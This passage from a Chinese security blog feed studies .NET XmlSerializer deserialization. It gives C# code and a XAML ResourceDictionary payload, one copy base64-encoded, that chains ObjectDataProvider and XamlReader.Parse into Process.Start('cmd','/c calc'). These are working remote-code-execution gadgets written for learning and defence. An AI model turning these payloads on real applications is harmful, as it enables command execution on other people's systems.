ObjectDataProvider&gt; expandedWrapper = <span class="keyword">new</span> ExpandedWrapper&lt;Person, ObjectDataProvider&gt;();</span><br><span class="line">            expandedWrapper.ProjectedProperty0 = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodName = <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line">            expandedWrapper.ProjectedProperty0.MethodParameters.Add(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            expandedWrapper.ProjectedProperty0.ObjectInstance = <span class="keyword">new</span> Person();</span><br><span class="line">            XmlSerializer xml = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(ExpandedWrapper&lt;Person, ObjectDataProvider&gt;));</span><br><span class="line">            xml.Serialize(writer, expandedWrapper);</span><br><span class="line">            <span class="built_in">string</span> result = Encoding.UTF8.GetString(memoryStream.ToArray());</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line"></span><br><span class="line">            memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">            xml.Deserialize(memoryStream);</span><br><span class="line"></span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是拿ExpandedWrapper这个类来进行包装  本质不变  变得就是这个Person里的Evil方法是我们手动添加的  但是在实际环境中是没有这种东西的   那么接下来我们就引出ResourceDictionary这个类</p><p>(其实看到这里这里就会发现ObjectDataProvider是可以调用任意类的任意方法的)</p><h2 id="ResourceDictionary"><a href="#ResourceDictionary" class="headerlink" title="ResourceDictionary"></a>ResourceDictionary</h2><p>ResourceDictionary即资源字典，用于wpf开发，既然是wpf，肯定涉及到xaml语言。先来看利用ResourceDictionary执行命令的一个payload。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;ResourceDictionary </span><br><span class="line">                    xmlns=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;</span> </span><br><span class="line">                    xmlns:d=<span class="string">&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;</span> </span><br><span class="line">                    xmlns:b=<span class="string">&quot;clr-namespace:System;assembly=mscorlib&quot;</span> </span><br><span class="line">                    xmlns:c=<span class="string">&quot;clr-namespace:System.Diagnostics;assembly=system&quot;</span>&gt;</span><br><span class="line">    &lt;ObjectDataProvider d:Key=<span class="string">&quot;&quot;</span> ObjectType=<span class="string">&quot;&#123;d:Type c:Process&#125;&quot;</span> MethodName=<span class="string">&quot;Start&quot;</span>&gt;</span><br><span class="line">        &lt;ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">            &lt;b:String&gt;cmd&lt;/b:String&gt;</span><br><span class="line">            &lt;b:String&gt;/c calc&lt;/b:String&gt;</span><br><span class="line">        &lt;/ObjectDataProvider.MethodParameters&gt;</span><br><span class="line">    &lt;/ObjectDataProvider&gt;</span><br><span class="line">&lt;/ResourceDictionary&gt;</span><br></pre></td></tr></table></figure><p>生成Demo(不是上诉payload的Demo  只是演示一下是咋生成的)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> name = <span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">        <span class="comment">// private int age = 114;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">XmlDeserialize</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            <span class="keyword">var</span> psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">            <span class="comment">// 去掉多余的环境变量</span></span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            <span class="keyword">var</span> p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            objectDataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.MethodParameters.Add(<span class="string">&quot;/c calc.exe&quot;</span>);</span><br><span class="line">            objectDataProvider.ObjectInstance = p;</span><br><span class="line">            <span class="keyword">var</span> resourceDictionary = <span class="keyword">new</span> ResourceDictionary();</span><br><span class="line">            resourceDictionary[<span class="string">&quot;a&quot;</span>] = objectDataProvider;</span><br><span class="line">            <span class="keyword">var</span> payload = XamlWriter.Save(resourceDictionary);</span><br><span class="line">            Console.WriteLine(payload);</span><br><span class="line">            XamlReader.Parse(payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释下这段xaml：</p><ol><li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li><li>d:Key=”” 起别名为空，在xaml语法中，Key这个键值必须有。</li><li>ObjectType表示对象类型</li><li>d:Type 等同于typeof()</li><li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li><li>c:Process 等同于System.Diagnostics.Process</li></ol><p>整个xaml被解析之后，等同于创建了一个ObjectDataProvider对象，该对象又会自动调用<code>System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c calc&quot;)</code></p><p>因为是xaml的语言，我们使用XamlReader.Parse()来解析它</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">XmlDeserialization</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//这里的base64就是上面xml的payload</span></span><br><span class="line">            <span class="built_in">string</span> p = <span class="string">&quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;</span>;</span><br><span class="line">            <span class="built_in">byte</span>[] vs = Convert.FromBase64String(p);</span><br><span class="line">            <span class="built_in">string</span> xml = Encoding.UTF8.GetString(vs);</span><br><span class="line">            XmlDeserialize(xml);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XmlDeserialize</span>(<span class="params"><span class="built_in">string</span> o</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            XamlReader.Parse(o);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时相当于我们利用XamlReader.Parse()进行了进一步利用，对于xmlserializer来说攻击链从原来的</p><ul><li>ObjectDataProvider -&gt; Person.Evil()</li></ul><p>转变为</p><ul><li>ObjectDataProvider -&gt; XamlReader.Parse() -&gt; ObjectDataProvider -&gt; System.Diagnostics.Process.Start(“cmd.exe”,”/c calc”)</li></ul><p><strong>拿java来说ObjectDataProvider 更像是commons-collections的InvokerTransformer，可以调用任意类的任意方法。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先就是针对初始化时<code>new XmlSerializer(type)</code>的type参数，如果type可控，就可以利用ObjectDataProvider调用XamlReader的Parse进行RCE。</p><p>当然也要关注<code>XamlReader.Parse(xml)</code>中的xml是否可控。 </p><p>这里的话我们是使用了ResourceDictionary和ExpanderWrapper去用泛型绕过类型的限制</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserialization/blob/m</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
</feed>
